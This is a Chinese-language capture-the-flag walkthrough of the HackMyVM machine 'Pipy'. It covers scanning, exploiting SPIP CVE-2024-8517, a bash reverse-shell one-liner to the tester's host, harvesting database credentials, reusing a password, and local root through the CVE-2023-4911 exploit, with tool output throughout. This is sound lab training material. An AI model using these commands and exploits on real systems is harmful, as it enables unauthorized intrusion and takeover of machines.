# hmv_Pipy

# 0.简介

**靶机**：[hackmyvm - Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 10:33 CST
Nmap scan report for tiny.hmv (192.168.205.143)
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:47:C9:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

先看**80端口**，**22端口**候补

# 2.踩点

![Image](https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62)

扫描有没有漏洞（不得不说，群里面的web大佬**Anjv-W.**  推荐的扫洞工具就是好用，点赞👍）

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u http://192.168.205.143               

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 7607
[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 182 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1702 (Reduced 1602 Requests)
[INF] Using Interactsh Server: oast.online
[CVE-2024-8517] [http] [critical] http://192.168.205.143/spip.ph%70?pag%65=spip_pass&lang=fr
[waf-detect:apachegeneric] [http] [info] http://192.168.205.143
[openssh-detect] [tcp] [info] 192.168.205.143:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"]
[ssh-password-auth] [javascript] [info] 192.168.205.143:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.143:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"]
[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 ["["publickey","password"]"]
[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 ["Vulnerable to Terrapin"]
[composer-config:composer.json] [http] [info] http://192.168.205.143/composer.json
[composer-config:composer.json] [http] [info] http://192.168.205.143/vendor/composer/installed.json
[metatag-cms] [http] [info] http://192.168.205.143 ["SPIP 4.2.0"]
[readme-md] [http] [info] http://192.168.205.143/README.md
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.143
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.143
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.143
[apache-detect] [http] [info] http://192.168.205.143 ["Apache/2.4.52 (Ubuntu)"]
[spip-detect:spip_version] [http] [info] http://192.168.205.143 ["4.2.0"]
[configuration-listing] [http] [medium] http://192.168.205.143/config/
```

有一个[CVE-2024-8517](https://github.com/Chocapikk/CVE-2024-8517)漏洞，我们利用一下

![Image](https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12)

非授权远程执行更喜欢了🤩

```bash
git clone https://github.com/Chocapikk/CVE-2024-8517.git
cd CVE-2024-8517
python3 -m venv env
source env/bin/activate
pip install -r requirements.txt 
┌──(env)─(kali㉿kali)-[~/test/tmp/CVE-2024-8517]
└─$ python3 exploit.py -u http://192.168.205.143          
✅ Target is vulnerable! Command Output: www-data
                                                                                                                                     
ℹ  Interactive shell started. Type `exit` to quit.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

deactivate #退出虚拟环境命令
rm -rf env #删除虚拟环境
```

成功，但是我们要弹个**反弹shell**回去，因为它这个脚本的shell有限制

```bash
$ bash -c "bash -i >& /dev/tcp/192.168.205.141/8888 0>&1"
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@pipy:/var/www/html$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@pipy:/var/www/html$ ls -la
total 156
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 .
drwxr-xr-x  4 www-data www-data  4096 Oct  5  2023 ..
-rw-r--r--  1 www-data www-data  7045 Feb 23  2023 CHANGELOG.md
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 IMG
-rw-r--r--  1 www-data www-data 35147 Feb 23  2023 LICENSE
-rw-r--r--  1 www-data www-data   842 Feb 23  2023 README.md
-rw-r--r--  1 www-data www-data   178 Feb 23  2023 SECURITY.md
-rw-r--r--  1 www-data www-data  1761 Feb 23  2023 composer.json
-rw-r--r--  1 www-data www-data 27346 Feb 23  2023 composer.lock
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 config
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 ecrire
-rw-r--r--  1 www-data www-data  4307 Feb 23  2023 htaccess.txt
-rw-r--r--  1 www-data www-data    42 Feb 23  2023 index.php
drwxr-xr-x  5 www-data www-data  4096 Oct  3  2023 local
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 plugins-dist
-rw-r--r--  1 www-data www-data  3645 Feb 23  2023 plugins-dist.json
drwxr-xr-x 12 www-data www-data  4096 Oct  3  2023 prive
-rw-r--r--  1 www-data www-data   973 Feb 23  2023 spip.php
-rw-r--r--  1 www-data www-data  1212 Feb 23  2023 spip.png
-rw-r--r--  1 www-data www-data  1673 Feb 23  2023 spip.svg
drwxr-xr-x 10 www-data www-data  4096 Oct  3  2023 squelettes-dist
drwxr-xr-x  5 www-data www-data  4096 Jan 18 02:35 tmp
drwxr-xr-x  6 www-data www-data  4096 Oct  3  2023 vendor
www-data@pipy:/var/www/html$ cd config/
www-data@pipy:/var/www/html/config$ ls -al
total 48
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 .
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..
-rw-rw-rw-  1 www-data www-data   197 Oct  3  2023 .htaccess
-rw-rw-rw-  1 www-data www-data     0 Oct  3  2023 .ok
-rw-rw-rw-  1 www-data www-data   109 Oct  3  2023 chmod.php
-rw-rw-rw-  1 www-data www-data   163 Oct  3  2023 cles.php
-rw-rw-rw-  1 www-data www-data   243 Oct  3  2023 connect.php
-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php
-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
www-data@pipy:/var/www/html/config$ cat connect.php
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
www-data@pipy:/var/www/html/config$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 503
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use spip;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [spip]> show tables;
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)

MariaDB [spip]> select * from spip_auteurs\G
*************************** 1. row ***************************
   id_auteur: 1
         nom: Angela
         bio: 
       email: angela@pipy.htb
    nom_site: 
    url_site: 
       login: angela
        pass: 4ng3l4
     low_sec: 
      statut: 0minirezo
   webmestre: oui
         maj: 2023-10-04 17:28:39
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 13:50:34
 alea_actuel: 387046876651c39a45bc836.13502903
  alea_futur: 465278670651d6da4349d85.01841245
       prefs: a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";}
cookie_oubli: NULL
      source: spip
        lang: 
    imessage: 
 backup_cles: 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM=
*************************** 2. row ***************************
   id_auteur: 2
         nom: admin
         bio: 
       email: admin@pipy.htb
    nom_site: 
    url_site: 
       login: admin
        pass: $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2
     low_sec: 
      statut: 1comite
   webmestre: non
         maj: 2023-10-04 17:31:03
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 17:31:03
 alea_actuel: 1540227024651d7e881c21a5.84797952
  alea_futur: 439334464651da1526dbb90.67439545
       prefs: a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";}
cookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o=
      source: spip
        lang: fr
    imessage: oui
 backup_cles: 
2 rows in set (0.000 sec)
```

切换至`angela`

```bash
www-data@pipy:/var/www/html/config$ su - angela
Password: 
angela@pipy:~$ id
uid=1000(angela) gid=1000(angela) groups=1000(angela)
```

继续提权

```bash
angela@pipy:~$ ls -la
total 40
drwxr-x--- 6 angela angela 4096 Oct 17  2023 .
drwxr-xr-x 3 root   root   4096 Oct  4  2023 ..
lrwxrwxrwx 1 angela angela    9 Oct 17  2023 .bash_history -> /dev/null
-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc
drwx------ 3 angela angela 4096 Oct  5  2023 .cache
drwxrwxr-x 3 angela angela 4096 Oct  3  2023 .local
-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile
drwx------ 3 angela angela 4096 Oct  3  2023 snap
drwx------ 2 angela angela 4096 Oct  2  2023 .ssh
-rw-r--r-- 1 angela angela    0 Oct  2  2023 .sudo_as_admin_successful
-rw------- 1 angela angela   33 Oct  5  2023 user.txt
angela@pipy:~$ cd /opt/
angela@pipy:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/opt$ cd /tmp/
angela@pipy:/tmp$ ls -al
total 12
drwxrwxrwt  2 root     root     4096 Jan 18 02:44 .
drwxr-xr-x 19 root     root     4096 Oct  2  2023 ..
-rw-------  1 www-data www-data   19 Jan 18 02:44 phpMHrr6q
angela@pipy:/tmp$ cd /mnt/
angela@pipy:/mnt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/mnt$ find / -perm -4000 -type f 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/pkexec
/snap/snapd/23545/usr/lib/snapd/snap-confine
/snap/snapd/20092/usr/lib/snapd/snap-confine
/snap/core20/2434/usr/bin/chfn
/snap/core20/2434/usr/bin/chsh
/snap/core20/2434/usr/bin/gpasswd
/snap/core20/2434/usr/bin/mount
/snap/core20/2434/usr/bin/newgrp
/snap/core20/2434/usr/bin/passwd
/snap/core20/2434/usr/bin/su
/snap/core20/2434/usr/bin/sudo
/snap/core20/2434/usr/bin/umount
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2434/usr/lib/openssh/ssh-keysign
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core/17200/bin/mount
/snap/core/17200/bin/ping
/snap/core/17200/bin/ping6
/snap/core/17200/bin/su
/snap/core/17200/bin/umount
/snap/core/17200/usr/bin/chfn
/snap/core/17200/usr/bin/chsh
/snap/core/17200/usr/bin/gpasswd
/snap/core/17200/usr/bin/newgrp
/snap/core/17200/usr/bin/passwd
/snap/core/17200/usr/bin/sudo
/snap/core/17200/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/17200/usr/lib/openssh/ssh-keysign
/snap/core/17200/usr/lib/snapd/snap-confine
/snap/core/17200/usr/sbin/pppd
/snap/core/16202/bin/mount
/snap/core/16202/bin/ping
/snap/core/16202/bin/ping6
/snap/core/16202/bin/su
/snap/core/16202/bin/umount
/snap/core/16202/usr/bin/chfn
/snap/core/16202/usr/bin/chsh
/snap/core/16202/usr/bin/gpasswd
/snap/core/16202/usr/bin/newgrp
/snap/core/16202/usr/bin/passwd
/snap/core/16202/usr/bin/sudo
/snap/core/16202/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/16202/usr/lib/openssh/ssh-keysign
/snap/core/16202/usr/lib/snapd/snap-confine
/snap/core/16202/usr/sbin/pppd
angela@pipy:/mnt$ /sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
angela@pipy:/mnt$ ss -tuln | grep tcp
tcp   LISTEN 0      80                  127.0.0.1:3306      0.0.0.0:*        
tcp   LISTEN 0      4096            127.0.0.53%lo:53        0.0.0.0:*        
tcp   LISTEN 0      128                   0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      1024                127.0.0.1:4226      0.0.0.0:*        
tcp   LISTEN 0      511                         *:80              *:*        
tcp   LISTEN 0      128                      [::]:22           [::]:*        
angela@pipy:/mnt$ nc
nc          nc.openbsd  
angela@pipy:/mnt$ nc 127.0.0.1 4226
a
hello
root
angela@pipy:/mnt$ ls
angela@pipy:/mnt$ nc 127.0.0.1 4226
root
admin
```

什么都没找到,还没定时任务，不会是**内核提权**吧，尝试一下可不可以使用自动化工具提权

```bash
angela@pipy:/mnt$ cd /tmp/
angela@pipy:/tmp$ wget 192.168.205.141/traitor-386
--2025-01-18 02:52:07--  http://192.168.205.141/traitor-386
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8475976 (8.1M) [application/octet-stream]
Saving to: ‘traitor-386’

traitor-386                                                  0%[                                                                       traitor-386                                                100%[========================================================================================================================================>]   8.08M  --.-KB/s    in 0.03s   

2025-01-18 02:52:07 (282 MB/s) - ‘traitor-386’ saved [8475976/8475976]

angela@pipy:/tmp$ chmod +x traitor-386 
angela@pipy:/tmp$ ./traitor-386 -a

                                                                                                                                     
▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                            
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                    
https://github.com/liamg/traitor                                                                                                     
                                                                                                                                     
[+] Assessing machine state...                                                                                                       
[+] Checking for opportunities...
[+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
[+][kernel:CVE-2022-0847] Opportunity found, trying to exploit it...
[+][kernel:CVE-2022-0847] Attempting to set root password...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][kernel:CVE-2022-0847] Starting shell...
[+][kernel:CVE-2022-0847] Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored.
[+][kernel:CVE-2022-0847] Setting up tty...
[+][kernel:CVE-2022-0847] Attempting authentication as root...
[+][kernel:CVE-2022-0847] Restoring contents of /etc/passwd...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][error] Exploit failed: invalid password
[+] Continuing to look for opportunities
[+] Nothing found to exploit.
```

不可以，那还是我们自己找吧

```bash
angela@pipy:/tmp$ uname -a
Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
angela@pipy:/tmp$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

找一下，发现**[CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)**可以，但是要用特定的脚本，有些脚本不行

```bash
#kali
┌──(kali㉿kali)-[~/test/tmp]
└─$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
┌──(kali㉿kali)-[~/test/tmp]
└─$ python3 -m http.server 80                                                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
#靶机
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:17--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... failed: Connection refused.
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:25--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3044 (3.0K) [application/octet-stream]
Saving to: ‘main.zip’

main.zip                                                   0%[                                                                       main.zip.1                                                 100%[========================================================================================================================================>]   2.97K  --.-KB/s    in 0s    

2025-01-18 03:06:25 (21.8 MB/s) - ‘main.zip’ saved [3044/3044]

angela@pipy:/tmp$ unzip main.zip
Archive:  main.zip
acf0d3a8bd4c437475a7c4c83f5790e53e8103cb
   creating: CVE-2023-4911-main/
  inflating: CVE-2023-4911-main/Makefile  
  inflating: CVE-2023-4911-main/README.md  
  inflating: CVE-2023-4911-main/exp.c  
  inflating: CVE-2023-4911-main/gen_libc.py  
angela@pipy:/tmp$ cd CVE-2023-4911-main/
angela@pipy:/tmp/CVE-2023-4911-main$ make
gcc -o exp exp.c
python3 gen_libc.py
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
./exp
try 100
# id
uid=0(root) gid=0(root) groups=0(root),1000(angela)

```